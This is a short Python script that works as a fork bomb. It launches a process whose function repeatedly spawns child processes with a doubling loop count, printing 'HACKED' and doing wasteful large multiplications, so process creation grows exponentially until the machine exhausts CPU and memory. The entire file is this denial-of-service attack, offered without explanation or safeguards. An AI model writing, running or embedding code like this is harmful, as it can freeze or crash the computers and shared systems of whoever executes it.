from multiprocessing import Process
#from multithreading import Thread
def func(child):
	child=child
	for i in range(child):
		no=999999999999999999999999999*99999999999999999999999999
		print('-'*10+'HACKED'+'-'*10)
		process=Process(target=func,args=(child*2,))
		process.start()
obj=Process(target=func,args=(2,))
obj.start()

